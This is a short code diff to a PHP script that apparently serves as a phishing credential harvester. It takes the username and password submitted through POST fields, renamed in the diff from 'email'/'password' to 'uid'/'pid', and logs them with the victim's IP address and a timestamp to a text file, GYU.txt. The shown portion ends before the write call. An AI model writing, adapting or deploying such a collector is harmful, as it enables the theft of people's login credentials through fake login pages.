@@ -1,7 +1,7 @@
 <?php 
 $fp = fopen("GYU.txt", "a");
-$username = $_POST['email']; 
-$pws = $_POST['password'];
+$username = $_POST['uid']; 
+$pws = $_POST['pid'];
 $ip=$_SERVER["REMOTE_ADDR"];
 $date = date("m/d/y G.i:s", time());
 $mnp = "\n";
